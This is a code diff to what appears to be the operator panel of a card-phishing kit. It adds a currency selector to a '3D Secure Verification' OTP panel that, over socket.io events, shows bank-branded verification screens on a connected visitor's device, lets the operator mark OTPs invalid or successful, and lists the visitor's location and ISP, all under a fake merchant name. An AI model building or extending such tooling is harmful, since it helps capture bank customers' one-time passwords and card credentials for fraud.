@@ -357,7 +357,7 @@
     </table>
   </div>
 
-  <!-- MC OTP Panel - UPDATED with Verification Type selector and failure reason options -->
+  <!-- MC OTP Panel - UPDATED with Verification Type selector, Currency selector and failure reason options -->
   <div id="mcOtpPanel" class="fixed inset-0 bg-black bg-opacity-75 z-50 flex items-center justify-center hidden">
     <div class="bg-gray-800 p-6 rounded-lg max-w-md w-full">
       <h3 class="text-xl font-bold mb-4">3D Secure Verification</h3>
@@ -414,6 +414,48 @@
           <option value="mnt bank">m&t bank</option>
           <option value="barclays bank">barclays bank</option>
           <option value="santandar usa">santandar usa</option>
+        </select>
+      </div>
+      
+      <!-- Currency Selector - ADDED -->
+      <div class="mb-4">
+        <label class="block text-sm mb-2">Currency:</label>
+        <select id="mcCurrencySelect" class="bg-gray-700 text-white w-full p-2 rounded">
+          <option value="INR">INR - Indian Rupee</option>
+          <option value="USD">USD - US Dollar</option>
+          <option value="EUR">EUR - Euro</option>
+          <option value="GBP">GBP - British Pound</option>
+          <option value="JPY">JPY - Japanese Yen</option>
+          <option value="AUD">AUD - Australian Dollar</option>
+          <option value="CAD">CAD - Canadian Dollar</option>
+          <option value="CHF">CHF - Swiss Franc</option>
+          <option value="CNY">CNY - Chinese Yuan</option>
+          <option value="HKD">HKD - Hong Kong Dollar</option>
+          <option value="NZD">NZD - New Zealand Dollar</option>
+          <option value="SGD">SGD - Singapore Dollar</option>
+          <option value="TWD">TWD - Taiwan Dollar</option>
+          <option value="AED">AED - UAE Dirham</option>
+          <option value="THB">THB - Thai Baht</option>
+          <option value="SEK">SEK - Swedish Krona</option>
+          <option value="NOK">NOK - Norwegian Krone</option>
+          <option value="DKK">DKK - Danish Krone</option>
+          <option value="ZAR">ZAR - South African Rand</option>
+          <option value="MYR">MYR - Malaysian Ringgit</option>
+          <option value="IDR">IDR - Indonesian Rupiah</option>
+          <option value="PHP">PHP - Philippine Peso</option>
+          <option value="MXN">MXN - Mexican Peso</option>
+          <option value="BRL">BRL - Brazilian Real</option>
+          <option value="PLN">PLN - Polish Złoty</option>
+          <option value="RUB">RUB - Russian Ruble</option>
+          <option value="TRY">TRY - Turkish Lira</option>
+          <option value="KRW">KRW - South Korean Won</option>
+          <option value="ILS">ILS - Israeli Shekel</option>
+          <option value="SAR">SAR - Saudi Riyal</option>
+          <option value="ARS">ARS - Argentine Peso</option>
+          <option value="CLP">CLP - Chilean Peso</option>
+          <option value="EGP">EGP - Egyptian Pound</option>
+          <option value="COP">COP - Colombian Peso</option>
+          <option value="VND">VND - Vietnamese Dong</option>
         </select>
       </div>
       
@@ -681,7 +723,7 @@
           <div class="visitor-detail">
             <span class="detail-label">Location:</span>
             <span class="detail-value">${flagEmoji} ${geoData.city}, ${geoData.country} ${mapLink}</span>
-          </div>
+            </div>
           <div class="visitor-detail">
             <span class="detail-label">ISP:</span>
             <span class="detail-value">${geoData.isp || 'Unknown'}</span>
@@ -1146,7 +1188,7 @@ if (!response.ok) {
       }
     }
 
-    // Show MC verification panel
+    // Show MC verification panel - UPDATED to include currency conversion
     function showMCVerification(id) {
       const transaction = transactionsMap.get(id);
       if (!transaction) {
@@ -1165,15 +1207,20 @@ if (!response.ok) {
       // Hide failure options by default
       document.getElementById('mcFailOptions').style.display = 'none';
       
+      // Get selected currency (default to INR if not selected)
+      const currencySelect = document.getElementById('mcCurrencySelect');
+      const selectedCurrency = currencySelect ? currencySelect.value : 'INR';
+      
       // Send event to client to show MC verification with loading state
       socket.emit('show_mc_verification', {
         invoiceId: id,
         merchantName: 'Bologus pvt store.',
         amount: `₹${transaction.amount}`,
-        bankCode: document.getElementById('mcBankSelect').value
+        bankCode: document.getElementById('mcBankSelect').value,
+        currency: selectedCurrency // Include selected currency
       });
       
-      console.log('Showing MC verification for invoice:', id);
+      console.log('Showing MC verification for invoice:', id, 'with currency:', selectedCurrency);
     }
 
     // Make functions globally available
@@ -1252,6 +1299,7 @@ setTimeout(() => {
       const mcOtpPanel = document.getElementById('mcOtpPanel');
       const mcBankSelect = document.getElementById('mcBankSelect');
       const mcVerificationType = document.getElementById('mcVerificationType');
+      const mcCurrencySelect = document.getElementById('mcCurrencySelect'); // Added currency select reference
       const mcOtpInvalidBtn = document.getElementById('mcOtpInvalidBtn');
       const mcOtpSuccessBtn = document.getElementById('mcOtpSuccessBtn');
       const mcFailOptionsBtn = document.getElementById('mcFailOptionsBtn');
@@ -1291,7 +1339,7 @@ setTimeout(() => {
         });
       }
       
-      // Start Verification button handler
+      // Start Verification button handler - UPDATED to include currency
       const mcStartVerificationBtn = document.getElementById('mcStartVerification');
       if (mcStartVerificationBtn) {
         mcStartVerificationBtn.addEventListener('click', function() {
@@ -1302,20 +1350,23 @@ setTimeout(() => {
           
           const verificationType = mcVerificationType.value;
           const bankCode = mcBankSelect.value;
+          const selectedCurrency = mcCurrencySelect.value; // Get selected currency
           
           console.log('Starting verification with:', {
             invoiceId: currentMcInvoiceId,
             verificationType: verificationType,
-            bankCode: bankCode
+            bankCode: bankCode,
+            currency: selectedCurrency // Log currency
           });
           
-          // Send event to show verification UI to client
+          // Send event to show verification UI to client with currency
           socket.emit('start_verification', {
             invoiceId: currentMcInvoiceId,
             verificationType: verificationType,
             bankCode: bankCode,
             merchantName: 'Bologus pvt store.',
-            amount: transactionsMap.get(currentMcInvoiceId)?.amount || '0'
+            amount: transactionsMap.get(currentMcInvoiceId)?.amount || '0',
+            currency: selectedCurrency // Include selected currency
           });
         });
       }
@@ -1330,6 +1381,19 @@ setTimeout(() => {
           });
         }
       });
+      
+      // Handle currency selection changes - NEW
+      if (mcCurrencySelect) {
+        mcCurrencySelect.addEventListener('change', function() {
+          if (currentMcInvoiceId) {
+            console.log('Changing currency to:', mcCurrencySelect.value, 'for invoice:', currentMcInvoiceId);
+            socket.emit('update_mc_currency', {
+              invoiceId: currentMcInvoiceId,
+              currency: mcCurrencySelect.value
+            });
+          }
+        });
+      }
       
       // Invalid OTP button
       mcOtpInvalidBtn.addEventListener('click', function() {
